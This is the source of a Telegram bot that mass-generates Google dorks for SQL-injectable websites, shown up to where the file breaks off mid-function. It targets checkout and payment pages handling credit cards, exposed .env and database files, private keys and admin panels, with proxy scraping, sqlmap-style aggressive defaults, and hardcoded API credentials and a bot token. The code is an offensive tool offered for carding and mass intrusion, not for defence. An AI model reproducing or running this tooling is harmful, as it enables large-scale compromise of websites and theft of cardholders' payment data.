"""addd Bot v1.0 — Spidey Performance Build"""
import os,io,json,time,asyncio,itertools,random,re,shutil,string,sys,tempfile,logging,zipfile,csv,base64,subprocess,concurrent.futures,threading as _threading
from datetime import datetime,timedelta
from pathlib import Path
from typing import List,Set,Dict,Optional,Callable
from urllib.parse import urlparse,parse_qs,parse_qsl,urlencode,urlunparse,quote_plus,unquote
import aiohttp
from bs4 import BeautifulSoup
from telegram import Update,InlineKeyboardButton,InlineKeyboardMarkup
from telegram.ext import Application,CommandHandler,MessageHandler,CallbackQueryHandler,ContextTypes,ConversationHandler,filters
from telegram.constants import ParseMode
from telegram.request import HTTPXRequest
try:
    from ddgs import DDGS
    DDGS_AVAILABLE=True
except ImportError:
    try:
        from duckduckgo_search import DDGS
        DDGS_AVAILABLE=True
    except ImportError:
        DDGS_AVAILABLE=False
try:
    from aiohttp_socks import ProxyConnector as _ProxyConnector
    _SOCKS_AVAILABLE=True
except ImportError:
    _SOCKS_AVAILABLE=False
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",level=logging.INFO)
logger=logging.getLogger(__name__)
try:
    import resource as _res
    _s_lim, _h_lim = _res.getrlimit(_res.RLIMIT_NOFILE)
    if _s_lim < 65536:
        _res.setrlimit(_res.RLIMIT_NOFILE, (min(65536, _h_lim), _h_lim))
except Exception:
    pass
_THREAD_POOL=concurrent.futures.ThreadPoolExecutor(max_workers=512)

# ── Auto Proxy Scraper ────────────────────────────────────────────────────────
_AUTO_PROXY_THRESHOLD = 30
_PROXY_SOURCES = [
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
]
_PROXY_RAW_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}:\d{2,5}$")

async def _fetch_proxy_source(session, url: str) -> list:
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=12), ssl=False) as r:
            text = await r.text()
            return [l.strip() for l in text.splitlines() if _PROXY_RAW_RE.match(l.strip())]
    except Exception:
        return []

async def _scrape_fresh_proxies() -> list:
    connector = aiohttp.TCPConnector(limit=20, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        results = await asyncio.gather(
            *[_fetch_proxy_source(session, u) for u in _PROXY_SOURCES],
            return_exceptions=True,
        )
    combined = []
    for r in results:
        if isinstance(r, list):
            combined.extend(r)
    return list(dict.fromkeys(combined))

API_ID    = 37023086
API_HASH ="2d8a7977da9141ec783ed27f4753f32e"
BOT_TOKEN = "8952703561:AAGEEJRj0ZIBIsBp7Ke04ibA69-_7UWNHmo"
ADMIN_IDS      = [8999053405]
ADMIN_USERNAME = "@LUCIFERCOMINGBABY"
TRIAL_MINUTES  = 100
COUPON_CODE    = "123"
DEFAULT_LEVEL     = 5
DEFAULT_RISK      = 3
DEFAULT_TECHNIQUE = "BEUSTQ"
DEFAULT_TAMPER    = "space2comment,between,charencode"
DEFAULT_THREADS   = 5
DEFAULT_TIMEOUT   = 420
DEFAULT_MAX_CONC  = 5

# ══════════════════════════════════════════════════════════════════════
#   GENERATORS
# ══════════════════════════════════════════════════════════════════════

PHP_PARAMS = [
    # Core SQLi params (top priority)
    "id", "pid", "cid", "oid", "nid", "sid", "tid", "fid", "uid",
    "cat", "category", "type", "sub", "page", "item", "product",
    "article", "news", "post", "entry", "record", "row",
    # E-commerce
    "order", "orderid", "order_id", "cart", "item_id", "product_id",
    "invoice", "invoice_id", "transaction", "ref",
    # Auth / user
    "user", "username", "userid", "user_id", "email", "account",
    "login", "token", "key", "hash", "session",
    # Navigation / filtering
    "view", "show", "display", "action", "method", "step", "tab",
    "mode", "lang", "language", "locale", "region", "sort", "order",
    "offset", "start", "limit", "per_page", "pager", "page_num",
    # Search / query
    "q", "search", "query", "keyword", "term", "s", "find",
    "filter", "tag", "topic", "subject",
    # Content / media
    "file", "filename", "path", "folder", "dir", "name",
    "album", "gallery", "image", "img", "photo", "video",
    # Misc PHP
    "redirect", "return", "next", "url", "link", "back", "from",
    "callback", "format", "output", "download", "report",
    "date", "year", "month", "day", "district", "country",
    "source", "src", "origin", "parent", "child",
    "module", "plugin", "template", "theme", "skin", "layout",
    "config", "settings", "option", "flag", "debug", "env",
    "code", "status", "level", "grade", "rank", "score",
    "group", "class", "section", "version", "build",
]

ASPX_PARAMS = [
    "id", "ID", "Id", "productId", "categoryId", "userId", "orderId",
    "itemId", "pageId", "newsId", "articleId", "postId",
    "searchTerm", "query", "q", "keyword", "filter", "sort",
    "page", "pageNum", "offset", "start", "limit", "count",
    "category", "type", "status", "mode", "action",
    "customerId", "memberId", "accountId", "sessionId",
]

# ══════════════════════════════════════════════════════════════════════════════
#  COUNTRY TARGETING  (top SQLi-rich TLDs)
# ══════════════════════════════════════════════════════════════════════════════

COUNTRY_TLDS = [
    ".br", ".in", ".tr", ".ro", ".it", ".pl", ".ru", ".ua",
    ".gr", ".mx", ".ar", ".co", ".pe", ".cl", ".id", ".ph",
    ".vn", ".th", ".my", ".pk", ".ng", ".eg", ".ma", ".bd",
    ".bg", ".hu", ".rs", ".sk", ".cz", ".pt", ".es", ".de",
    ".fr", ".nl", ".be", ".se", ".no", ".dk", ".fi", ".at",
]

COUNTRY_SITES = [
    "site:.br", "site:.in", "site:.tr", "site:.ro", "site:.it",
    "site:.pl", "site:.ru", "site:.ua", "site:.gr", "site:.mx",
    "site:.ar", "site:.co", "site:.pe", "site:.id", "site:.ph",
    "site:.vn", "site:.th", "site:.my", "site:.pk", "site:.bd",
    "site:.bg", "site:.hu", "site:.rs", "site:.sk", "site:.cz",
    "site:.pt", "site:.es", "site:.de", "site:.fr", "site:.nl",
]

# ══════════════════════════════════════════════════════════════════════════════
#  CMS-SPECIFIC DORKS
# ══════════════════════════════════════════════════════════════════════════════

CMS_DORKS = {
    "wordpress": [
        'inurl:"/wp-login.php" inurl:.php?id=',
        'inurl:"wp-content" inurl:.php?{param}=',
        'inurl:"wp-admin" inurl:.php?{param}=',
        'site:*.wordpress.com inurl:.php?{param}=',
        'inurl:"/?p=" inurl:.php ext:php',
        'inurl:"/wp-includes/" ext:php inurl:?id=',
        '"WordPress" inurl:index.php?{param}= -intext:"WordPress"',
        '"Powered by WordPress" inurl:.php?{param}=',
        'inurl:"page_id=" ext:php',
        'inurl:"cat=" inurl:"/wordpress/" ext:php',
    ],
    "joomla": [
        'inurl:"option=com_" inurl:.php?{param}=',
        'inurl:"index.php?option=com_content"',
        'inurl:"index.php?option=com_users"',
        '"Powered by Joomla" inurl:.php?id=',
        '"Joomla!" inurl:index.php?{param}=',
        'inurl:"com_k2" ext:php',
        'inurl:"/administrator/" inurl:index.php "{kw}"',
        'inurl:"option=com_" inurl:"view=article" inurl:"id="',
        'inurl:"option=com_virtuemart" inurl:"product_id="',
        '"Joomla CMS" inurl:.php?{param}= site:com',
    ],
    "opencart": [
        'inurl:"index.php?route=product" "{kw}"',
        'inurl:"index.php?route=checkout" "{kw}"',
        'inurl:"route=account/login" "{kw}"',
        '"Powered by OpenCart" inurl:.php?product_id=',
        '"OpenCart" inurl:checkout.php "{kw}"',
        'inurl:"index.php?route=product/product&product_id="',
        '"Shopping Cart" inurl:index.php?route= "{kw}"',
        'inurl:"/index.php?route=common/home" "{kw}"',
        '"OpenCart" inurl:"&category_id=" ext:php',
        '"opencart" inurl:.php?{param}= site:.com',
    ],
    "prestashop": [
        '"PrestaShop" inurl:index.php?id_product= "{kw}"',
        'inurl:"index.php?id_category=" site:com "{kw}"',
        '"PrestaShop" inurl:checkout "{kw}"',
        'inurl:"/index.php?controller=" inurl:"prestashop"',
        '"Powered by PrestaShop" inurl:.php?{param}=',
        'inurl:"index.php?id_product=" "{kw}"',
        '"PrestaShop" inurl:checkout.php intext:"credit card"',
        'inurl:"index.php?id_order=" "{kw}"',
        '"prestashop" inurl:.php?{param}= site:.com',
        'inurl:"index.php?controller=order&step=" "{kw}"',
    ],
    "magento": [
        'inurl:"/checkout/cart/" "{kw}"',
        'inurl:"/checkout/onepage/" "{kw}"',
        '"Magento" inurl:.php?id= "{kw}"',
        '"Powered by Magento" inurl:checkout',
        'inurl:"/catalog/product/view/id/"',
        'inurl:"/index.php/checkout/" "{kw}"',
        '"Magento Commerce" inurl:.php?{param}=',
        'inurl:"/customer/account/login/" "{kw}"',
        '"magento" inurl:.php?{param}= site:com',
        'inurl:"/sales/order/view/order_id/" "{kw}"',
    ],
    "drupal": [
        'inurl:"?q=node/" "{kw}"',
        'inurl:"?q=user/login" "{kw}"',
        '"Powered by Drupal" inurl:.php?{param}=',
        'inurl:"/node/" inurl:"?{param}=" site:com',
        '"X-Generator: Drupal" inurl:.php?id=',
        'inurl:"drupal" inurl:.php?{param}= "{kw}"',
        'inurl:"?q=content/" "{kw}" ext:php',
    ],
    "laravel": [
        'inurl:"/api/" inurl:".php?id=" "{kw}"',
        'intext:"Laravel" inurl:.php?{param}= "{kw}"',
        'inurl:"/public/" inurl:.php?{param}=',
        '"laravel" inurl:?{param}= site:com',
    ],
    "codeigniter": [
        'inurl:"/index.php/{param}/" "{kw}"',
        '"CodeIgniter" inurl:.php?{param}=',
        'inurl:"/index.php/user/login" "{kw}"',
        '"CodeIgniter" inurl:checkout "{kw}"',
    ],
}

# ══════════════════════════════════════════════════════════════════════════════
#  MAIN DORK TEMPLATES (300+)
# ══════════════════════════════════════════════════════════════════════════════

DORK_TEMPLATES = [
    # ── CATEGORY 1: SQLi Injectable PHP Pages ───────────────────────────────
    '{kw} *login inurl:.php?{param}=',
    '{kw} login inurl:.php?{param}=',
    '{kw} login inurl:index.php?{param}=',
    '{kw} login inurl:page.php?{param}=',
    '{kw} login inurl:view.php?{param}=',
    '"{kw}" ext:php inurl:?{param}=',
    '"{kw}" ext:php inurl:.php?{param}=',
    'ext:php inurl:?{param}= "{kw}"',
    '{kw} ext:php inurl:{param}=',
    '{kw} ext:php inurl:id=',
    '{kw} ext:php inurl:page=',
    '{kw} ext:php inurl:view=',
    '{kw} ext:php inurl:cat=',
    '{kw} ext:php inurl:type=',
    '{kw} ext:php inurl:action=',
    'inurl:.php?{param}= "{kw}"',
    'inurl:.php?{param}= {kw}',
    'inurl:.php?id= "{kw}"',
    'inurl:.php?id= {kw} site:com',
    '"{kw}" inurl:.php?{param}= site:.com',
    '{kw} inurl:.php?{param}= ext:php',
    '"{kw}" inurl:?{param}=',
    '{kw} inurl:?{param}=',
    '{kw} site:com inurl:.php?{param}=',
    '{kw} site:net inurl:.php?{param}=',

    # ── CATEGORY 2: Specific PHP Pages (high SQLi rate) ─────────────────────
    '"{kw}" inurl:view.php?id=',
    '"{kw}" inurl:index.php?id=',
    '"{kw}" inurl:page.php?id=',
    '"{kw}" inurl:item.php?id=',
    '"{kw}" inurl:news.php?id=',
    '"{kw}" inurl:article.php?id=',
    '"{kw}" inurl:post.php?id=',
    '"{kw}" inurl:read.php?id=',
    '"{kw}" inurl:detail.php?id=',
    '"{kw}" inurl:show.php?id=',
    '"{kw}" inurl:display.php?id=',
    '"{kw}" inurl:info.php?id=',
    '"{kw}" inurl:category.php?id=',
    '"{kw}" inurl:product.php?id=',
    '"{kw}" inurl:products.php?id=',
    '"{kw}" inurl:listing.php?id=',
    '"{kw}" inurl:store.php?id=',
    '"{kw}" inurl:catalog.php?id=',
    '"{kw}" inurl:search.php?{param}=',
    '"{kw}" inurl:results.php?{param}=',
    '"{kw}" inurl:gallery.php?id=',
    '"{kw}" inurl:album.php?id=',
    '"{kw}" inurl:media.php?id=',
    '"{kw}" inurl:download.php?id=',
    '"{kw}" inurl:file.php?id=',

    # ── CATEGORY 3: E-Commerce / Payment / CC Targeted ──────────────────────
    '"{kw}" inurl:checkout.php?id=',
    '"{kw}" inurl:payment.php?id=',
    '"{kw}" inurl:billing.php?id=',
    '"{kw}" inurl:invoice.php?id=',
    '"{kw}" inurl:order.php?id=',
    '"{kw}" inurl:cart.php?id=',
    '"{kw}" inurl:buy.php?id=',
    '"{kw}" inurl:purchase.php?id=',
    '"{kw}" inurl:pay.php?id=',
    '"{kw}" inurl:shop.php?{param}=',
    'inurl:checkout.php intext:"card number" "{kw}"',
    'inurl:payment.php intext:"credit card" "{kw}"',
    'inurl:checkout.php intext:"credit card" ext:php',
    'inurl:billing.php intext:"card number" ext:php',
    'intext:"card number" intext:"expiry" inurl:.php?{param}=',
    'intext:"credit card number" inurl:checkout ext:php',
    'intext:"debit card" inurl:payment.php ext:php',
    'inurl:checkout intext:"visa" intext:"mastercard" ext:php',
    'intext:"cvv" intext:"card number" inurl:.php?{param}=',
    'intext:"enter your credit card" inurl:.php',
    'inurl:order.php intext:"payment" intext:"card" "{kw}"',
    'intext:"billing information" intext:"card number" inurl:.php?{param}=',
    'intext:"secure payment" inurl:checkout.php "{kw}"',
    'intext:"payment method" intext:"credit card" inurl:.php?id=',
    'intext:"stripe" inurl:checkout.php ext:php',
    'intext:"paypal" inurl:checkout.php intext:"credit card" ext:php',
    'inurl:checkout.aspx intext:"card number"',
    'inurl:payment.aspx intext:"credit card" "{kw}"',

    # ── CATEGORY 4: Login / Admin / Dashboard Panels ─────────────────────────
    '"{kw}" inurl:login.php?{param}=',
    '"{kw}" inurl:admin.php?{param}=',
    '"{kw}" inurl:user.php?{param}=',
    '"{kw}" inurl:member.php?{param}=',
    '"{kw}" inurl:profile.php?{param}=',
    '"{kw}" inurl:dashboard.php?{param}=',
    '"{kw}" inurl:account.php?id=',
    '"{kw}" inurl:register.php?{param}=',
    '"{kw}" inurl:signup.php?{param}=',
    '"{kw}" inurl:subscription.php?{param}=',
    'intitle:"admin login" inurl:.php?{param}=',
    'intitle:"login" inurl:admin.php "{kw}"',
    'intitle:"administrator" inurl:.php?{param}= "{kw}"',
    'inurl:"/admin/" inurl:.php?{param}= "{kw}"',
    'inurl:"/administrator/" inurl:.php?id=',
    'inurl:"/manage/" inurl:.php?id= "{kw}"',
    'inurl:"/panel/" inurl:.php?{param}=',
    'inurl:"/cp/" inurl:.php?id=',
    'inurl:"/control/" inurl:.php?{param}= "{kw}"',
    'intext:"username" intext:"password" inurl:login.php?{param}=',

    # ── CATEGORY 5: ASPX / ASP / JSP / CFM Targets ──────────────────────────
    '"{kw}" inurl:.aspx?{param}=',
    '{kw} inurl:.aspx?id=',
    '{kw} ext:aspx inurl:?{param}=',
    '"{kw}" inurl:checkout.aspx',
    '"{kw}" inurl:payment.aspx?{param}=',
    '"{kw}" inurl:product.aspx?id=',
    '"{kw}" inurl:details.aspx?id=',
    '"{kw}" inurl:order.aspx?id=',
    '"{kw}" inurl:view.aspx?{param}=',
    '"{kw}" inurl:default.aspx?{param}=',
    '{kw} inurl:.asp?{param}=',
    '{kw} inurl:.asp?id=',
    '"{kw}" ext:asp inurl:?id=',
    '"{kw}" inurl:.jsp?{param}=',
    '{kw} inurl:.jsp?id=',
    '"{kw}" ext:jsp inurl:?id=',
    '{kw} inurl:.cfm?{param}=',
    '"{kw}" ext:cfm inurl:?id=',
    '"{kw}" inurl:.pl?id=',

    # ── CATEGORY 6: SQL Error Dorks (verbose = injectable!) ──────────────────
    'intext:"mysql_fetch_array()" inurl:.php?{param}=',
    'intext:"mysql_num_rows()" inurl:.php?{param}=',
    'intext:"You have an error in your SQL syntax" inurl:.php',
    'intext:"Warning: mysql_" inurl:.php?{param}=',
    'intext:"supplied argument is not a valid MySQL" inurl:.php',
    'intext:"ORA-01756:" inurl:.php',
    'intext:"ORA-00933:" inurl:.php',
    'intext:"Microsoft OLE DB Provider for SQL Server" inurl:.asp',
    'intext:"ODBC SQL Server Driver" inurl:.asp',
    'intext:"Incorrect syntax near" inurl:.asp',
    'intext:"Unclosed quotation mark before the character string" inurl:.asp',
    'intext:"mysqli_fetch_" inurl:.php?{param}=',
    'intext:"pg_query()" inurl:.php?{param}=',
    'intext:"sqlite_query()" inurl:.php?{param}=',
    'intext:"PDOException:" inurl:.php?{param}=',
    'intext:"SQLSTATE[" inurl:.php?{param}=',
    'intext:"SQL command not properly ended" inurl:.php',
    'intext:"Syntax error in query expression" inurl:.asp',
    'intext:"[Microsoft][ODBC" inurl:.asp?{param}=',
    'intext:"Division by zero in" inurl:.php?{param}=',

    # ── CATEGORY 7: OG DorkLab — Exposed Files ───────────────────────────────
    'filetype:sql intext:"INSERT INTO" "{kw}"',
    'filetype:sql intext:"CREATE TABLE" intext:"password"',
    'filetype:log intext:"password" intext:"username" "{kw}"',
    'filetype:env intext:"DB_PASSWORD" "{kw}"',
    'filetype:yml intext:"password" "{kw}"',
    'filetype:xml intext:"password" "{kw}"',
    'filetype:ini intext:"passwd" "{kw}"',
    'filetype:conf intext:"password" "{kw}"',
    'filetype:bak inurl:backup "{kw}"',
    'filetype:json intext:"api_key" "{kw}"',
    'filetype:txt intext:"username" intext:"password" "{kw}"',
    'filetype:csv intext:"credit card" "{kw}"',
    'filetype:xls intext:"password" intext:"email" "{kw}"',
    'filetype:xlsx intext:"card number" "{kw}"',
    'filetype:pem intext:"PRIVATE KEY"',
    'inurl:"/.env" intext:"DB_PASSWORD"',
    'inurl:"/config.php" intext:"$db_pass"',
    'inurl:"/database.yml" intext:"password"',
    'inurl:"/phpMyAdmin" intitle:"phpMyAdmin"',
    'inurl:"/phpmyadmin/" intitle:"phpMyAdmin"',
    'inurl:"db.php" intext:"mysql_connect"',
    'inurl:"config.php" intext:"mysql_connect"',
    'inurl:"wp-config.php" intext:"DB_PASSWORD"',
    'inurl:"settings.php" intext:"database_password"',

    # ── CATEGORY 8: OG DorkLab — Sensitive Directories ──────────────────────
    'intitle:"Index of" intext:"backup" "{kw}"',
    'intitle:"Index of" intext:".sql" "{kw}"',
    'intitle:"Index of" intext:"password" "{kw}"',
    'intitle:"Index of" intext:"config" intext:".php"',
    'intitle:"Index of" "/admin" "{kw}"',
    'intitle:"Index of" "/database" "{kw}"',
    'intitle:"Index of" intext:".bak" "{kw}"',
    'intitle:"Index of" "/uploads" intext:"jpg" "{kw}"',
    'intitle:"Index of" intext:"dump.sql"',
    'intitle:"Index of" intext:"db_backup"',

    # ── CATEGORY 9: OG DorkLab — Vulnerable Servers ─────────────────────────
    'intext:"phpMyAdmin" intext:"MySQL" inurl:index.php?{param}=',
    'intitle:"phpinfo()" inurl:.php?{param}=',
    'intitle:"Test Page for Apache" inurl:.php?id=',
    'intext:"X-Powered-By: PHP" inurl:.php?{param}=',
    'intext:"Server at" intitle:"Apache" inurl:.php?id=',
    'intitle:"Welcome to nginx!" inurl:.php?{param}=',
    'intext:"IIS Windows Server" inurl:.asp?{param}=',
    'intitle:"500 Internal Server Error" inurl:.php?id=',

    # ── CATEGORY 10: Network / IoT / Panel Dorks ─────────────────────────────
    'intitle:"Login" inurl:"/login.php" inurl:.php?{param}=',
    'intitle:"Sign In" inurl:"/signin.php" inurl:.php?{param}=',
    'intitle:"Member Login" inurl:.php?{param}=',
    'intitle:"Customer Login" inurl:.php?{param}=',
    'intitle:"User Login" inurl:login.php?{param}=',
    'intitle:"Admin" inurl:admin.php?{param}=',
    'intitle:"Control Panel" inurl:.php?{param}=',
    'intitle:"Dashboard" inurl:admin.php?id=',

    # ── CATEGORY 11: Country + TLD targeted ──────────────────────────────────
    '{kw} inurl:.php?id= site:.br',
    '{kw} inurl:.php?id= site:.in',
    '{kw} inurl:.php?id= site:.tr',
    '{kw} inurl:.php?id= site:.ro',
    '{kw} inurl:.php?id= site:.it',
    '{kw} inurl:.php?id= site:.pl',
    '{kw} inurl:.php?{param}= site:.ru',
    '{kw} inurl:.php?{param}= site:.ua',
    '{kw} inurl:.php?{param}= site:.gr',
    '{kw} inurl:.php?{param}= site:.mx',
    '{kw} inurl:.php?{param}= site:.ar',
    '{kw} inurl:.php?{param}= site:.id',
    '{kw} inurl:.php?{param}= site:.ph',
    '{kw} inurl:.php?{param}= site:.vn',
    '{kw} inurl:.php?{param}= site:.th',
    '{kw} inurl:.php?{param}= site:.pk',
    '{kw} inurl:.php?{param}= site:.bd',
    '{kw} inurl:.php?{param}= site:.bg',
    '{kw} inurl:.php?{param}= site:.rs',
    '{kw} inurl:.php?{param}= site:.pt',
    'ext:php inurl:?{param}= "{kw}" site:.com',
    'ext:php inurl:?{param}= "{kw}" site:.net',
    'ext:php inurl:?{param}= "{kw}" site:.org',
    'ext:php inurl:?{param}= "{kw}" site:.shop',
    'ext:php inurl:?{param}= "{kw}" site:.store',

    # ── CATEGORY 12: Multi-param / Complex Dorks ─────────────────────────────
    '{kw} inurl:.php?id=1&cat=',
    '{kw} inurl:.php?{param}=1&id=',
    '{kw} inurl:.php?id=&type= ext:php',
    'inurl:.php?id=&cat= "{kw}" ext:php',
    'inurl:.php?page=&id= "{kw}"',
    'inurl:.php?{param}=&action= "{kw}"',
    'inurl:.php?item=&id= "{kw}" ext:php',
    '{kw} inurl:index.php?id=&module=',
    '{kw} inurl:index.php?id=&do=',
    '~{kw} ext:php inurl:?{param}= site:com',
    '~{kw} login ext:php inurl:?{param}= site:com',
]

# ══════════════════════════════════════════════════════════════════════════════
#  PAYMENT-FOCUSED KEYWORD TEMPLATES
# ══════════════════════════════════════════════════════════════════════════════

PAYMENT_KEYWORD_TEMPLATES = [
    "credit card checkout", "debit card payment", "visa mastercard checkout",
    "online payment form", "secure checkout page", "card payment gateway",
    "credit card billing", "debit card billing", "card number entry",
    "payment processing site", "credit card subscription", "card details form",
    "buy with credit card", "checkout credit card", "payment credit card form",
    "online store checkout", "ecommerce payment page", "card accepted checkout",
    "visa payment form", "mastercard payment form", "amex payment checkout",
    "stripe payment form", "paypal checkout credit card", "square payment form",
    "credit card order form", "debit card order form", "card billing form",
    "secure payment page", "enter card details", "credit card number form",
    "cvv card checkout", "card expiry billing", "online shopping checkout",
    "payment gateway form", "shop checkout credit card", "store payment form",
    "buy now credit card", "add card payment", "card holder billing",
    "subscription credit card", "membership credit card payment",
    "donate credit card", "fund credit card checkout", "renew card billing",
    "upgrade credit card payment", "purchase credit card form",
    "woocommerce credit card", "shopify checkout card", "magento payment card",
    "opencart credit card", "prestashop checkout card", "bigcommerce card",
    "credit card form php", "payment form php checkout", "billing php card",
    "checkout php visa mastercard", "order php credit card",
]

KEYWORD_TEMPLATES = [
    "plans", "issue report", "api pricing", "emulator not", "to fix",
    "failed", "error codes", "issue today", "cheapest plan", "failed process",
    "recording failed", "not connecting", "common problem", "booking price",
    "appointment system", "traveller review", "login", "method without",
    "game not", "cancel", "auth fail", "windows", "plan", "streaming issues",
    "what fees", "account", "pricing for", "loading packages", "price meaning",
    "include taxes", "month", "pricing uk", "cheapest plans", "hacked recovery",
    "price canada", "personal bookings", "tv remote", "additional member",
    "recovery email", "payment method", "internet reddit", "fix app",
    "reviews", "password login", "student plans", "buffering", "black screen",
    "policy for", "free trial", "month plans", "basic plan", "password",
    "login portal", "monthly membership", "with vpn", "issue 2024",
    "store page", "fix buffering", "problem series", "to uninstall",
    "price uk", "solve problem", "failed attempting", "admin",
    "add people", "subscription", "portal login", "is stuck", "issues signing",
    "plans 2024", "to find", "why not", "why keeps", "to open",
    "fix problem", "error code", "update price", "refund", "free download",
    "billing online", "fixed", "seller commission", "comparison",
    "plan deals", "number not", "channels", "registration not",
    "checkout error", "payment declined", "billing failed", "subscription error",
    "account suspended", "login failed", "verification failed",
    "transaction failed", "order failed", "payment not processed",
    "card declined", "refund status", "order cancelled", "account hacked",
    "password reset", "2fa problem", "otp not received", "account recovery",
    "unable to pay", "payment gateway error", "checkout problem",
    "card not accepted", "payment processing", "invoice download",
    "subscription renewal", "auto renewal", "membership expired",
    "upgrade plan", "downgrade plan", "billing cycle", "payment history",
    "transaction history", "billing address",
] + PAYMENT_KEYWORD_TEMPLATES

PAYMENT_SEEDS = [
    "checkout", "payment", "billing", "shop", "store", "order", "cart",
    "buy", "purchase", "subscribe", "donate", "ecommerce", "online store",
    "credit card", "debit card", "visa", "mastercard", "amex", "paypal",
    "stripe", "square", "klarna", "afterpay", "apple pay", "google pay",
    "woocommerce", "shopify", "magento", "opencart", "prestashop",
    "card payment", "secure checkout", "payment form", "card number",
]


# ══════════════════════════════════════════════════════════════════════════════
#  KEYWORD GENERATOR
# ══════════════════════════════════════════════════════════════════════════════

def generate_keywords(seed_brands: list, count_per_brand: int) -> list:
    results = set()
    templates = KEYWORD_TEMPLATES.copy()
    random.shuffle(templates)

    all_seeds = list(dict.fromkeys(
        [b.strip().lower() for b in seed_brands if b.strip()] + PAYMENT_SEEDS
    ))

    for brand in all_seeds:
        for tmpl in templates:
            results.add(f"{brand} {tmpl}")
            results.add(f"{tmpl} {brand}")
            if len(results) >= count_per_brand * max(len(seed_brands), 1) + len(PAYMENT_SEEDS) * 20:
                break

    pay_templates = PAYMENT_KEYWORD_TEMPLATES.copy()
    random.shuffle(pay_templates)
    for pt in pay_templates:
        results.add(pt)
        for brand in [b.strip().lower() for b in seed_brands if b.strip()]:
            results.add(f"{brand} {pt}")
            results.add(f"{pt} {brand}")

    tmpl_pairs = list(itertools.combinations(
        random.sample(templates, min(len(templates), 500)), 2
    ))
    random.shuffle(tmpl_pairs)
    for a, b in tmpl_pairs:
        results.add(f"{a} {b}")
        if len(results) >= 1_000_000:
            break

    for t in templates:
        results.add(t)

    result_list = list(results)
    random.shuffle(result_list)
    return result_list


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN DORK GENERATOR
# ══════════════════════════════════════════════════════════════════════════════

def generate_dorks(keywords: list, limit: int = 1_000_000) -> list:
    """
    Gᴇɴᴇʀᴀᴛᴇ HQ SQLi-targeted dorks in 12 categories:
    - SQLi injectable PHP pages
    - Specific PHP pages (view/index/page/item)
    - E-commerce / payment / CC
    - Login / admin panels
    - ASPX / ASP / JSP / CFM
    - SQL error-based (verbose DB errors)
    - Exposed files / sensitive dirs
    - CMS-specific (WP/Joomla/OC/PS)
    - Country TLD targeted
    - Multi-param complex dorks
    """
    results = []
    templates = DORK_TEMPLATES.copy()
    params = PHP_PARAMS.copy()

    random.shuffle(templates)
    random.shuffle(params)

    kw_pool = keywords.copy()
    random.shuffle(kw_pool)

    template_cycle = itertools.cycle(templates)
    param_cycle    = itertools.cycle(params)

    kw_index = 0
    while len(results) < limit:
        tmpl  = next(template_cycle)
        param = next(param_cycle)
        kw    = kw_pool[kw_index % len(kw_pool)]
        kw_index += 1

        dork = tmpl.replace("{kw}", kw).replace("{param}", param)
        results.append(dork)

        if kw_index >= len(kw_pool) * len(templates):
            kw_pool = keywords.copy()
            random.shuffle(kw_pool)
            kw_index = 0

        if len(results) >= limit:
            break

    random.shuffle(results)
    return results


# ══════════════════════════════════════════════════════════════════════════════
#  HQ SQLi DORK GENERATOR  (Gold Dork Parser + OG DorkLab style)
# ══════════════════════════════════════════════════════════════════════════════

def generate_hq_sqli_dorks(
    keywords: list = None,
    limit: int     = 10_000,
    include_error_dorks: bool  = True,
    include_payment_dorks: bool = True,
    include_cms_dorks: bool    = True,
    include_country_dorks: bool = True,
    target_countries: list  = None,
    target_cms: list        = None,
) -> list:
    """
    Gᴇɴᴇʀᴀᴛᴇ ultra-HQ SQLi dorks focused on the highest-yield targets.
    Combines Doctor SQL auto-dump patterns, OG DorkLab templates, and
    Gold Dork Parser multi-engine syntax.

    Returns deduplicated, shuffled list of high-quality SQLi dorks.
    """
    if keywords is None:
        keywords = ["shop", "store", "checkout", "payment", "login", "account"]
    if target_countries is None:
        target_countries = COUNTRY_SITES[:15]
    if target_cms is None:
        target_cms = list(CMS_DORKS.keys())

    results = set()
    params  = PHP_PARAMS[:30]  # top 30 most injectable params
    random.shuffle(params)

    param_cycle = itertools.cycle(params)
    kw_pool     = keywords.copy()
    random.shuffle(kw_pool)

    # ── Core SQLi param dorks ──────────────────────────────────────────────
    sqli_patterns = [
        'inurl:.php?id= "{kw}"',
        'inurl:.php?cat= "{kw}"',
        'inurl:.php?pid= "{kw}"',
        'inurl:.php?article= "{kw}"',
        'inurl:.php?{param}= "{kw}" ext:php',
        'inurl:.php?{param}= site:com',
        'inurl:.php?{param}= site:net',
        'inurl:.php?{param}= site:org',
        'inurl:index.php?id= "{kw}"',
        'inurl:view.php?id= "{kw}"',
        'inurl:page.php?id= "{kw}"',
        'inurl:detail.php?id= "{kw}"',
        'inurl:item.php?id= "{kw}"',
        'inurl:news.php?id= "{kw}"',
        'inurl:product.php?id= "{kw}"',
        'inurl:category.php?id= "{kw}"',
        'inurl:search.php?{param}= "{kw}"',
        'inurl:list.php?{param}= "{kw}"',
        'inurl:.aspx?id= "{kw}"',
        'inurl:.asp?id= "{kw}"',
        'inurl:.jsp?id= "{kw}"',
    ]

    for kw in kw_pool:
        for pat in sqli_patterns:
            param = next(param_cycle)
            results.add(pat.replace("{kw}", kw).replace("{param}", param))
            if len(results) >= limit // 4:
                break
        if len(results) >= limit // 4:
            break

    # ── SQL Error dorks (highest SQLi rate) ──────────────────────────────
    if include_error_dorks:
        error_dorks = [
            'intext:"mysql_fetch_array()" inurl:.php?{param}=',
            'intext:"You have an error in your SQL syntax" inurl:.php?{param}=',
            'intext:"Warning: mysql_" inurl:.php?{param}=',
            'intext:"supplied argument is not a valid MySQL" inurl:.php',
            'intext:"mysqli_fetch_" inurl:.php?{param}=',
            'intext:"PDOException:" inurl:.php?{param}=',
